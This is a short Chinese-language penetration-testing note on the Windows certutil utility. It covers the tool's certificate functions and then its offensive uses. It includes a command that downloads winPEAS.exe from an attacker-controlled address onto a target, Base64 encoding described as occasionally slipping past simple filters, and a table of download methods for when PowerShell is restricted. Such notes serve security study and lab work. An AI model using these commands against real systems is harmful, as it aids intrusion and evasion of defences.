# certutil

## 介绍

certutil = Certificate Utility

cert = Certificate（证书）

util = utility（工具）

Windows证书管理工具

## 用途

（1）管理证书

（2）处理证书存储

（3）编码/解码证书数据

## 攻击视觉用途

（1）从URL下载文件

（2）Base64编码/解码

## 从本机下载文件到目标机

certutil -urlcache -split -f http://10.10.10.1/winPEAS.exe winPEAS.exe

-urlcache -> 从URL下载

-split -> 分块下载

-f -> 强制覆盖

## 重要

（1）Windows几乎一定存在

（2）不依赖PowerShell

（3）不需要管理员权限

（4）防护环境简单

## Base64 编码/解码

### 编码文件

certutil -encode input.exe output.txt

### 解码文件

certutil -decode input.txt output.exe

（1）偶尔绕过简单拦截

（2）不是常规操作

## 和PowerShell下载方式对比

| 场景           | 推荐              |
| -------------- | ----------------- |
| PowerShell可用 | Invoke-WebRequest |
| PS被限制       | certutil          |
| Linux          | wget/curl         |
| 内网           | SMB               |

